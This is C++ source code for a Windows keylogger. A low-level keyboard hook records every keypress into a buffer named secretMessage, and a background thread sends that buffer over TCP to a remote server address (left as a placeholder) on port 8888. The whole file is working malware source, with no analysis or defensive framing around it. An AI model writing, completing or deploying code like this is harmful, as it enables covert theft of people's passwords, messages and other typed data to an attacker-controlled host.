#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>
#include <condition_variable>


#pragma comment(lib, "Ws2_32.lib")

#define PORT 8888
#define SERVER_IP "IP....."

std::string secretMessage = " ";
std::mutex mtx;
std::condition_variable cv;

#pragma region KeyLogger
void KeyLog(int key)
{
	std::lock_guard<std::mutex> lock(mtx);
	if (key == VK_BACK)
		secretMessage += "[BACKSPACE]";
	else if (key == VK_RETURN)
		secretMessage += "[ENTER]";
	else if (key == VK_SPACE)
		secretMessage += "[SPACE]";
	else if (key == VK_TAB)
		secretMessage += "[TAB]";
	else if (key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT)
		secretMessage += "[SHIFT]";
	else if (key == VK_CONTROL || key == VK_RCONTROL || key == VK_LCONTROL)
		secretMessage += "[CONTROL]";
	else if (key == VK_ESCAPE)
		secretMessage += "[ESCAPE]";
	else if (key == VK_OEM_PERIOD)
		secretMessage += ".";
	else if (key >= 'A' && key <= 'Z')
		secretMessage += (char)key;
	else if (key >= '0' && key <= '9')
		secretMessage += (char)key;
	//else
	//	output << "[" << key << "]";
	cv.notify_one();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
		int key = pKeyboard->vkCode;
		KeyLog(key);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

#pragma endregion

void SendMessages(SOCKET client)
{
	if (client == INVALID_SOCKET)
	{
		std::cerr << "Param Socket failed" << std::endl;
		return;
	}
	std::unique_lock<std::mutex> uniq_lck(mtx);
	while (true)
	{
		cv.wait(uniq_lck);
		send(client, secretMessage.c_str(), secretMessage.length(), 0);
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

	WSADATA ws;

	if (WSAStartup(MAKEWORD(2, 2), &ws) == SOCKET_ERROR)
	{
		std::cerr << "Wsa failed with error" << std::endl;
		return 1;
	}

	SOCKET client = socket(AF_INET, SOCK_STREAM, 0);
	if (client == INVALID_SOCKET)
	{
		std::cerr << "Socket failed" << std::endl;
		WSACleanup();
		return 1;
	}

	struct sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(PORT);
	inet_pton(AF_INET, SERVER_IP, &servAddr.sin_addr);

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

	if (connect(client, (const sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
	{
		std::cerr << "Connect failed" << std::endl;
		closesocket(client);
		WSACleanup();
		return 1;
	}
	else
	{
		std::thread thr1(SendMessages, client);
		thr1.detach();
		MSG msg;

		char buffer[255] = { 0 };
		recv(client, buffer, sizeof(buffer), 0);
		std::cout << "Server: " << buffer << std::endl;
		while (true)
		{
			std::cout << secretMessage << std::endl;
			while (GetMessage(&msg, NULL, 0, 0))
			{
				DispatchMessage(&msg);
			}
		}

	}

	
	closesocket(client);
	UnhookWindowsHookEx(hook);

	WSACleanup();
	
	return 0;
}